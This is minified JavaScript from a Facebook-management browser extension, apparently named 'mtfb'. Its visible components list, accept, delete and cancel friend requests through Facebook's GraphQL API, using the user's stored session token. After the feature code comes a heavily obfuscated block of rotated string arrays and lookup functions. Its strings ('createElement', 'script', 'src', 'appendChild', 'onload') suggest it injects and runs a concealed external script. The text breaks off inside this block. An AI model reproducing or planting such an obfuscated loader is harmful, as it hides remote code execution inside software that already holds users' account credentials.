noreferrer",className:"span-name",target:"_blank",children:Object(f.jsx)("span",{className:"span-name",children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"ID",id:"id",accessor:"id",maxWidth:200,sortable:!1},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.loading}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.id].selected,disabled:this.state.loading,onChange:()=>this.handleSingleCheckboxChange(e.original.id)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),show:this.state.lastFetchedUID===localStorage.id,sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"})})]})]})})]})]})}}var _t=Ot;const vt=[{label:"UID",key:"uid"},{label:"Name",key:"name"},{label:"Gender",key:"gender"},{label:"Social context",key:"text"},{label:"Request Date",key:"timestamp"}];class yt extends n.a.Component{constructor(){super(),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.fetchRequests=e=>{if(e.edges.forEach((e=>{this.requestData[e.node.id]={uid:e.node.id,name:e.node.name,image:e.node.profile_picture.uri,gender:e.node.gender,text:e.node.social_context.text,timestamp:1e3*e.time}})),e.page_info&&e.page_info.has_next_page)return this.buildFriendsRequest(e.page_info.end_cursor);this.setState({selection:this.requestData,data:Object.keys(this.requestData).map((e=>this.requestData[e])),gotData:!0})},this.buildFriendsRequest=(e=null)=>{const t=new FormData;e=e?'"'.concat(e,'"'):null,t.append("__user",localStorage.id),t.append("__a",1),t.append("dpr",1),t.append("fb_dtsg",localStorage.dt),t.append("fb_api_caller_class","RelayModern"),t.append("fb_api_req_friendly_name","FriendingCometFriendRequestsPanelPaginationQuery"),t.append("variables",'{"count":8,"cursor":'.concat(e,',"scale":1}')),t.append("doc_id",0xa597ac557145c),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:t,cancelToken:this.axiosSource.token}).then((e=>{if((e=e.data).data){const t=e.data.viewer.friending_possibilities;this.fetchRequests(t)}else this.setState({gotData:!0}),this.setAlert("Error","Something went south, contact Loc for help","error")})).catch((e=>L.a.isCancel(e)?console.log("Loc is the best"):e.response&&0===e.response.status?this.buildFriendsRequest():(this.setState({gotData:!0}),void(e.response&&e.response.data&&e.response.data.error?this.setAlert("Error",e.response.data.error.message,"error"):this.setAlert("Error","Something went south, contact Loc for help","error")))))},this.resetCheckbox=()=>{if(!this.checkboxTable)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.requestData);for(let o=a;o<i;o++)if(!r[e.sortedData[o].uid].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.requestData);for(let o=i;o<n&&(r[t.sortedData[o].uid].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.requestData);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.updateData=()=>{this.requestData=this.state.selection},this.processRequest=(e,t)=>{const s=e.pop();if(!s)return this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success");this.processRequestHelper(s,e,t)},this.processRequestHelper=(e,t,s)=>{const a=s?{fb_api_req_friendly_name:"FriendingCometFriendRequestConfirmMutation",doc_id:0xa12aad783904a,action:"accepted",icon:"\ud83d\udc4d",key:"friend_request_accept"}:{fb_api_req_friendly_name:"FriendingCometFriendRequestDeleteMutation",doc_id:0xa9273d7f55192,action:"removed",icon:"\ud83d\udc4b",key:"friend_request_delete"},i=new FormData;i.append("__user",localStorage.id),i.append("__a",1),i.append("dpr",1),i.append("fb_dtsg",localStorage.dt),i.append("fb_api_caller_class","RelayModern"),i.append("fb_api_req_friendly_name",a.fb_api_req_friendly_name),i.append("doc_id",a.doc_id),i.append("variables",'{"input":{"friend_requester_id":"'.concat(e.uid,'","source":"friends_tab","actor_id":"').concat(localStorage.id,'","client_mutation_id":"1"},"scale":1}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:i,cancelToken:this.axiosSource.token}).then((i=>{if((i=i.data).data){const n=i.data[a.key];if(n&&n.friend_requester&&n.friend_requester.friendship_status){const i="".concat(a.icon," ").concat(e.name,": ").concat(a.action,".\n").concat(this.state.results),n=this.state.data.filter((t=>t.uid!==e.uid)),c=this.state.selection;c[e.uid]&&delete c[e.uid],this.setState({data:n,selection:c,results:i},(()=>{this.updateData(),this.processRequest(t,s)}))}else if(i.errors){const a="\u274c ".concat(e.name,": ").concat(i.errors[0].summary,".\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t,s)}else{const a="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t,s)}}else{i=ue(i.slice(9));const a="\u274c ".concat(e.name,": ").concat(i.errorSummary,".\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t,s)}})).catch((a=>{if(L.a.isCancel(a))return console.log("Loc is the best");const i="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:i}),this.processRequest(t,s)}))},this.handleRequest=e=>{if(0===this.state.data.length)return this.setAlert("Noiceeee","You got no friend requests!","success");const t=[];if(Object.keys(this.state.selection).forEach((e=>{this.state.selection[e].selected&&t.push(this.state.selection[e])})),0===t.length)return this.setAlert("Noiceeee","No friend request got selected!","success");const s=e?"Accept":"Remove";this.setState({loading:!0,alert:Object(f.jsx)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.processRequest(t,e)},onCancel:()=>{this.hideAlert(),this.setState({loading:!1})},confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:s,cancelBtnText:"Cancel",showCancel:!0,btnSize:"",children:"You are about to ".concat(s," ").concat(t.length," friend request").concat(t.length>1?"s":"","!")})})},this.componentDidMount=()=>{ga_trackButtonClick("friends_request"),pe().then((e=>{const t=De.a.decrypt(this.state.locmai,e);t===this.state.locmai?(this.setState({aw2721d:!0}),this.buildFriendsRequest()):(this.setState({aw2721d:!1}),this.setAlert("Access denied",t,"error"))})).catch((()=>{this.setState({aw2721d:null})}))},this.requestData={},this.activeFriendData={},this.state={data:[],results:"",selection:{},selectAll:!1,alert:null,loading:!1,gotData:!1,aw2721d:null,locmai:localStorage.id};const e=L.a.CancelToken;this.axiosSource=e.source()}render(){let e;return!1===this.state.aw2721d?e=Object(f.jsx)(ut,{setAlert:this.setAlert}):null===this.state.aw2721d?e=Object(f.jsx)(E.a,{children:Object(f.jsx)(M.a,{children:Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})})}):!0===this.state.aw2721d&&(e=this.state.gotData?Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-info",children:Object(f.jsx)("i",{className:"fas fa-users"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Incoming Friend Requests"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})})]}),Object(f.jsx)("hr",{}),Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("pre",{className:"card-text",style:{maxHeight:"500px",whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif"},children:this.state.results})]}),Object(f.jsx)(R.a,{md:"12",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-success",onClick:()=>this.handleRequest(!0),disabled:this.state.loading,children:"Accept"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:()=>this.handleRequest(!1),disabled:this.state.loading,children:"Remove"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary",disabled:this.state.loading,children:Object(f.jsxs)(we.CSVLink,{data:this.state.data,headers:vt,filename:"mtfb-incoming-friend-requests.csv",children:[Object(f.jsx)("i",{className:"fas fa-file-download"})," CSV"]})})]})})]}),Object(f.jsx)(Se.a,{data:this.state.data,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:!0,sortable:!0,defaultSorted:[{id:"url",desc:!0}],getTrProps:(e,t)=>{if(t&&t.row){return{onClick:e=>{this.state.loading||"form-check-sign"===e.target.className||"form-check-input"===e.target.className||"span-name"===e.target.className||this.handleSingleCheckboxChange(t.original.uid)},style:this.state.selection[t.original.uid].selected?{background:"#344675"}:{}}}return{}},resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{height:34,src:e.original.image,alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:"https://www.facebook.com/".concat(e.original.uid),rel:"noopener noreferrer",className:"span-name",target:"_blank",children:Object(f.jsx)("span",{className:"span-name",children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"UID",id:"uid",accessor:e=>parseInt(e.uid),show:!1},{Header:"Gender",id:"gender",accessor:"gender"},{Header:"Social context",id:"text",accessor:e=>{const t=parseInt(e.text.split(" ")[0]);return isNaN(t)?0:t},Cell:e=>Object(f.jsx)("div",{children:e.original.text})},{Header:"Request date",id:"timestamp",accessor:"timestamp",Cell:e=>Object(f.jsx)("div",{children:q()(e.original.timestamp).format("MMMM Do YYYY, h:mm:ss a")})},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.loading}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.uid].selected,disabled:this.state.loading,onChange:()=>this.handleSingleCheckboxChange(e.original.uid)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"})]})}):Object(f.jsx)(E.a,{children:Object(f.jsxs)(M.a,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Fetching data..."}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})]})})),Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),Object(f.jsx)(R.a,{md:"12",children:e})]})]})}}var kt=yt;const St=[{label:"UID",key:"uid"},{label:"Name",key:"name"},{label:"Social context",key:"text"},{label:"Request Date",key:"timestamp"}];class wt extends n.a.Component{constructor(){super(),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.fetchRequests=(e,t)=>{if(0xe43dffa689bda===t?e.edges.forEach((e=>{this.requestData[e.node.id]=Object(a.a)(Object(a.a)({},this.requestData[e.node.id]),{},{uid:e.node.id,name:e.node.name,image:e.node.profile_picture.uri,text:e.node.social_context.text})})):e.edges.forEach((e=>{this.requestData[e.ent_fbid]=Object(a.a)(Object(a.a)({},this.requestData[e.ent_fbid]),{},{timestamp:1e3*e.cursor.split(":")[0]})})),e.page_info&&e.page_info.has_next_page)return this.buildFriendsRequest(t,e.page_info.end_cursor);0xb8cc005bc5bb5===t&&this.setState({gotTimeStamp:!0});const s=Object.assign(this.state.gotDocID,{});s[t]=!0,this.setState({gotDocID:s},(()=>this.postTable()))},this.postTable=()=>{this.state.gotDocID[0xe43dffa689bda]&&this.state.gotDocID[0xb8cc005bc5bb5]&&this.setState({selection:this.requestData,data:Object.keys(this.requestData).map((e=>this.requestData[e])),gotData:!0})},this.buildFriendsRequest=(e,t=null)=>{const s=new FormData;t=t?'"'.concat(t,'"'):null;const a=0xe43dffa689bda===e?"outgoing_friend_requests_connection":"activity_log_stories",i=0xe43dffa689bda===e?"FriendingCometOutgoingRequestsDialogPaginationQuery":"CometActivityLogListPaginationQuery",n=0xe43dffa689bda===e?'{"count":8,"cursor":'.concat(t,',"scale":1}'):'{"category":"SENTFRIENDREQUESTS","category_key":"SENTFRIENDREQUESTS","count":8,"cursor":'.concat(t,',"feedLocation":null,"month":null,"privacy":"NONE","scale":1,"timeline_visibility":"ALL","year":null,"id":"').concat(localStorage.id,'"}');s.append("__user",localStorage.id),s.append("__a",1),s.append("dpr",1),s.append("fb_dtsg",localStorage.dt),s.append("fb_api_caller_class","RelayModern"),s.append("fb_api_req_friendly_name",i),s.append("variables",n),s.append("doc_id",e),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((t=>{if((t=t.data).data){const s=0xe43dffa689bda===e?t.data.viewer[a]:t.data.node[a];this.fetchRequests(s,e)}else{const t=Object.assign(this.state.gotDocID,{});t[e]=!0,this.setState({gotDocID:t},(()=>this.postTable()))}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");if(s.response&&0===s.response.status)return this.buildFriendsRequest(e,t);s.response&&s.response.data&&s.response.data.error&&this.setAlert("Error",s.response.data.error.message,"error");const a=Object.assign(this.state.gotDocID,{});a[e]=!0,this.setState({gotDocID:a},(()=>this.postTable()))}))},this.resetCheckbox=()=>{if(!this.checkboxTable)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.requestData);for(let o=a;o<i;o++)if(!r[e.sortedData[o].uid].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.requestData);for(let o=i;o<n&&(r[t.sortedData[o].uid].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.requestData);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.updateData=()=>{this.requestData=this.state.selection},this.processRequest=e=>{const t=e.pop();if(!t)return this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success");this.processRequestHelper(t,e)},this.processRequestHelper=(e,t)=>{const s=new FormData;s.append("__user",localStorage.id),s.append("__a",1),s.append("dpr",1),s.append("fb_dtsg",localStorage.dt),s.append("fb_api_caller_class","RelayModern"),s.append("fb_api_req_friendly_name","FriendingCometFriendRequestCancelMutation"),s.append("doc_id",0xb7613c32283de),s.append("variables",'{"input":{"cancelled_friend_requestee_id":"'.concat(e.uid,'","source":"profile","actor_id":"').concat(localStorage.id,'","client_mutation_id":"1"},"scale":1}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((s=>{if((s=s.data).data){const a=s.data.friend_request_cancel;if(a&&a.cancelled_friend_requestee){const s="\ud83d\udc4b ".concat(e.name,": removed.\n").concat(this.state.results),a=this.state.data.filter((t=>t.uid!==e.uid)),i=this.state.selection;i[e.uid]&&delete i[e.uid],this.setState({data:a,selection:i,results:s},(()=>{this.updateData(),this.processRequest(t)}))}else if(s.errors){const a="\u274c ".concat(e.name,": ").concat(s.errors[0].summary,".\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t)}else{const s="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:s}),this.processRequest(t)}}else{s=ue(s.slice(9));const a="\u274c ".concat(e.name,": ").concat(s.errorSummary,".\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t)}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");const a="\u274c ".concat(e.name,": request failed.\n").concat(this.state.results);this.setState({results:a}),this.processRequest(t)}))},this.handleRequest=()=>{if(0===this.state.data.length)return this.setAlert("Noiceeee","You got no outgoing friend requests!","success");const e=[];if(Object.keys(this.state.selection).forEach((t=>{this.state.selection[t].selected&&e.push(this.state.selection[t])})),0===e.length)return this.setAlert("Noiceeee","No friend request got selected!","success");this.setState({loading:!0,alert:Object(f.jsx)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.processRequest(e)},onCancel:()=>{this.hideAlert(),this.setState({loading:!1})},confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:"Cancel requests",cancelBtnText:"Stop",showCancel:!0,btnSize:"",children:"You are about to cancel ".concat(e.length," outgoing friend request").concat(e.length>1?"s":"","!")})})},this.componentDidMount=()=>{ga_trackButtonClick("friends_request"),pe().then((e=>{const t=De.a.decrypt(this.state.locmai,e);t===this.state.locmai?(this.setState({aw2721d:!0}),this.buildFriendsRequest(0xe43dffa689bda),this.buildFriendsRequest(0xb8cc005bc5bb5)):(this.setState({aw2721d:!1}),this.setAlert("Access denied",t,"error"))})).catch((()=>{this.setState({aw2721d:null})}))},this.requestData={},this.activeFriendData={},this.state={data:[],results:"",selection:{},selectAll:!1,alert:null,loading:!1,gotData:!1,aw2721d:null,gotDocID:{},gotTimeStamp:!1,locmai:localStorage.id};const e=L.a.CancelToken;this.axiosSource=e.source()}render(){let e;return!1===this.state.aw2721d?e=Object(f.jsx)(ut,{setAlert:this.setAlert}):null===this.state.aw2721d?e=Object(f.jsx)(E.a,{children:Object(f.jsx)(M.a,{children:Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})})}):!0===this.state.aw2721d&&(e=this.state.gotData?Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-info",children:Object(f.jsx)("i",{className:"fas fa-users"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Outgoing Friend Requests"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})})]}),Object(f.jsx)("hr",{}),Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("pre",{className:"card-text",style:{maxHeight:"500px",whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif"},children:this.state.results})]}),Object(f.jsx)(R.a,{md:"12",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:()=>this.handleRequest(),disabled:this.state.loading,children:"Remove"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary",disabled:this.state.loading,children:Object(f.jsxs)(we.CSVLink,{data:this.state.data,headers:St,filename:"mtfb-outgoing-friend-requests.csv",children:[Object(f.jsx)("i",{className:"fas fa-file-download"})," CSV"]})})]})})]}),Object(f.jsx)(Se.a,{data:this.state.data,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:!0,sortable:!0,defaultSorted:[{id:"url",desc:!0}],getTrProps:(e,t)=>{if(t&&t.row){return{onClick:e=>{this.state.loading||"form-check-sign"===e.target.className||"form-check-input"===e.target.className||"span-name"===e.target.className||this.handleSingleCheckboxChange(t.original.uid)},style:this.state.selection[t.original.uid].selected?{background:"#344675"}:{}}}return{}},resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{height:34,src:e.original.image,alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:"https://www.facebook.com/".concat(e.original.uid),rel:"noopener noreferrer",className:"span-name",target:"_blank",children:Object(f.jsx)("span",{className:"span-name",children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"UID",id:"uid",accessor:e=>parseInt(e.uid),show:!1},{Header:"Social context",id:"text",accessor:e=>{const t=parseInt(e.text.split(" ")[0]);return isNaN(t)?0:t},Cell:e=>Object(f.jsx)("div",{children:e.original.text})},{Header:"Request date",id:"timestamp",accessor:"timestamp",show:this.state.gotTimeStamp,Cell:e=>Object(f.jsx)("div",{children:q()(e.original.timestamp).format("MMMM Do YYYY, h:mm:ss a")})},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.loading}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.uid].selected,disabled:this.state.loading,onChange:()=>this.handleSingleCheckboxChange(e.original.uid)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"})]})}):Object(f.jsx)(E.a,{children:Object(f.jsxs)(M.a,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Fetching data..."}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})]})})),Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),Object(f.jsx)(R.a,{md:"12",children:e})]})]})}}var At=[{path:"/dashboard",name:"Extension Dashboard",icon:"tim-icons icon-bank",component:ke,layout:"/admin"},{collapse:!0,name:"Tools",icon:"tim-icons icon-settings",state:"freeCollapse",views:[{collapse:!0,name:"Friend Requests",mini:"FR",state:"multiCollapse",views:[{path:"/friend-request-incoming",name:"Incoming",mini:"I",component:kt,layout:"/admin"},{path:"/friend-request-outgoing",name:"Outgoing",mini:"O",component:wt,layout:"/admin"}]},{path:"/friends-remover",name:"Friends Remover",mini:"FR",component:Fe,layout:"/admin"},{path:"/groups-scanner",name:"Groups Scanner",mini:"GR",component:nt,layout:"/admin"},{path:"/pages-scanner",name:"Pages Scanner",mini:"PS",component:_t,layout:"/admin"},{path:"/interaction-scanner",name:"Interaction Scanner",mini:"IS",component:Je,layout:"/admin"},{path:"/privacy-changer",name:"Privacy Changer",mini:"PC",component:Xe,layout:"/admin"},{path:"/message-downloader",name:"Message Downloader",mini:"MD",component:Qe,layout:"/admin"},{path:"/profile-picture-guard",name:"Profile Picture Guard",mini:"PPG",component:st,layout:"/admin"}]},{path:"/get-premium",name:"Premium",icon:"tim-icons icon-spaceship",component:jt,layout:"/admin"},{name:"Tutorials",icon:"tim-icons icon-triangle-right-17",redirect:"https://www.youtube.com/channel/UChV3HYCK_15LaciiEbNTAhQ?sub_confirmation=1",layout:"/admin"},{name:"Reviews",icon:"tim-icons icon-shape-star",redirect:"https://chrome.google.com/webstore/detail/eojdckfcadamkapabechhbnkleligand/reviews",layout:"/admin"},{name:"Info",icon:"tim-icons icon-alert-circle-exc",redirect:"https://mtfb.lnmai.com/",layout:"/admin"}],Dt=s(253),Ct=s.n(Dt);const Nt={height:"100vh",position:"relative"},It={margin:0,position:"absolute",top:"50%",left:"50%",transform:"translate(-50%, -50%)"},Pt=["toString","0xa","0x2","0x3","314627MJldIG","0x3b","0x34","0x6","shift","0x1b","0x1a","0x1d","0x10","0x21","appendChild","0x15","0x2f","0x33","0x25","0x1c","0x38","0x2b","onerror","async","0x2a","0x1f","0x16","0x0","src","0x26","36RzhZDv","runtime","0xc","0x2e","0x23","382vElzmx","0x3f","0x9","0x3d","0x19","0x18","substring","0x32","0x31","0x3c","1wIvbeH","map","0x27","41443kzxTJO","0x22","text/javascript","381995kfqLow","0x1e","0xd","0x5","0x36","0x2c","0x41","0x28","0x17","0x12","0x2d","createElement","0xb","0x29","104290fultAj","0x11","floor","0x3a","head","0x24","0x3e","22jaOWQL","0x8","0x13","0x4","0xf","push","0x14","getElementsByTagName","split","0x7","0xe","170312osDHZI","onload","random","0x35"];var Tt,Lt;Tt=Pt,Lt=364,function(e){for(;--e;)Tt.push(Tt.shift())}(++Lt);const Ft=function(e,t){return Pt[e-=0]},qt=[Ft("0x8"),"36464ZrYODC","0x19",Ft("0x42"),Ft("0x49"),Ft("0x2b"),Ft("0x2f"),Ft("0x28"),"0x1b",Ft("0x12"),"push",Ft("0x4e"),Ft("0x56"),"fromCharCode",Ft("0x23"),"anonymous",Ft("0x48"),Ft("0xc"),"0x1c",Ft("0x26"),"0x18",Ft("0x21"),Ft("0x9"),Ft("0x47"),Ft("0x52"),Ft("0x54"),Ft("0x44"),Ft("0x19"),Ft("0x43"),Ft("0x33"),Ft("0x22"),Ft("0x13"),Ft("0x5"),"0x1a",Ft("0x4a"),"every",Ft("0xf"),Ft("0x2"),Ft("0xd"),"0xc",Ft("0x55"),"crossOrigin","0x4",Ft("0x39"),Ft("0x31"),Ft("0xb"),Ft("0x2a"),"reduce","0x1e",Ft("0x40"),"0x9",Ft("0x3a"),Ft("0x53"),Ft("0x2e"),Ft("0x41"),Ft("0x2c"),Ft("0x4b"),Ft("0x4f"),Ft("0x7"),"0x20","0xf","0x1",Ft("0x32"),Ft("0x25"),Ft("0xe"),Ft("0x35")];var Rt,Et;Rt=qt,Et=370,function(e){for(;--e;)Rt[Ft("0x3d")](Rt[Ft("0x4f")]())}(++Et);const Mt=function(e,t){return qt[e-=0]},Bt=[Ft("0x3f"),Mt("0xb"),Mt(Ft("0x3e")),Mt(Ft("0x36")),Mt(Ft("0x10")),Mt("0x28"),"type",Mt("0x1d"),Mt("0x17"),Mt(Ft("0x5")),Mt(Ft("0x1c")),Mt(Ft("0x46")),Ft("0x20"),Mt(Ft("0x16")),Mt("0x3b"),Mt(Ft("0x1f")),Mt(Ft("0x53")),Mt(Ft("0xd")),Mt(Ft("0x41")),Mt(Ft("0x32")),Mt(Ft("0x15")),Mt(Ft("0x17")),Mt(Ft("0x25")),Ft("0x3e"),Mt(Ft("0x2c")),Ft("0x6"),Mt(Ft("0x42")),Mt(Ft("0x3b")),Mt("0x1f"),Ft("0x15"),Mt(Ft("0x18")),"includes","0xb",Ft("0x38"),Ft("0x1e"),Mt(Ft("0x27")),Mt(Ft("0x2d")),Mt(Ft("0xb")),Mt(Ft("0x11")),Mt("0x25"),Ft("0x45"),Mt("0x29"),Mt(Ft("0x24")),Mt(Ft("0x37")),Mt(Ft("0x29"))];var Ut,Ht;Ut=Bt,Ht=244,function(e){for(;--e;)Ut.push(Ut[Mt("0x11")]())}(++Ht);const zt=function(e,t){return Bt[e-=0]},Gt=[zt(Mt(Ft("0x4c"))),zt(Mt(Ft("0x56"))),zt(Mt(Ft("0x26"))),zt(Mt(Ft("0xd"))),zt(Mt(Ft("0x3a"))),Mt("0x39"),zt(Mt("0x30")),zt(Mt(Ft("0x14"))),zt(Mt(Ft("0x11"))),Ft("0x1d"),zt(Mt("0x1e")),Mt("0x1"),"script",zt(Mt("0xc")),zt(Mt(Ft("0x2d"))),zt(Mt(Ft("0x51"))),zt(Mt(Ft("0x4a"))),zt(Mt(Ft("0x12"))),Mt(Ft("0x4")),zt(Mt("0x40")),Mt("0x37"),zt(Mt(Ft("0x1a"))),Mt(Ft("0x50")),Mt(Ft("0x1b")),zt(Ft("0x1f")),Mt(Ft("0x4d")),zt(Mt("0xf"))];var Qt,Yt;Qt=Gt,Yt=359,function(e){for(;--e;)Qt[zt(Mt(Ft("0x1a")))](Qt[zt(Mt("0x5"))]())}(++Yt);const Vt=function(e,t){return 